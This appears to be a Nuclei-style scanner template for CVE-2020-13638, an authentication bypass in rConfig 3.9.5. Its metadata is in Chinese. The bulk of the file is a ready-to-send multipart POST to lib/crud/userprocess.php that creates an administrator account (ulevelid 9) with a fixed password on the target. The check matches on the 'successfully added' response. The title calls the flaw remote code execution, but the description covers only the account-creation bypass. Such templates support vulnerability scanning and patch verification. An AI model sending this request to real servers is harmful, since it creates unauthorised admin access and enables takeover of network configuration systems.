id: CVE-2020-13638
info:
  name: rConfig 3.9.5 - Remote Code Execution
  author:
  - l0ne1y
  tags:
  - rconfig
  - rce
  description: |-
    rConfig 身份验证绕过导致任意创建管理员账户漏洞
    rConfig是一款开源的网络配置管理实用程序。

    rConfig 3.9.x系列3.9.7之前版本存在安全漏洞，该漏洞源于lib/crud/userprocess.php存在身份验证绕过，导致创建管理员帐户。
  reference:
  - https://www.rconfig.com/downloads/rconfig-3.9.5.zip
  - https://www.exploit-db.com/exploits/48878
  severity: high
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：
    https://www.rconfig.com/
requests:
- matchers:
  - type: word
    part: body
    words:
    - User {{randstr}} successfully added to Database
  - type: status
    status:
    - 302
  matchers-condition: and
  raw:
  - |
    POST /lib/crud/userprocess.php HTTP/1.1
    Host: {{Hostname}}
    Accept: */*
    Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
    Cookie: PHPSESSID={{randstr}}

    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="username"

    {{randstr}}
    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="passconf"

    Testing1@
    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="password"

    Testing1@
    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="email"

    test@{{randstr}}.tld
    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="editid"


    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="add"

    add
    --01b28e152ee044338224bf647275f8eb
    Content-Disposition: form-data; name="ulevelid"

    9
    --01b28e152ee044338224bf647275f8eb--
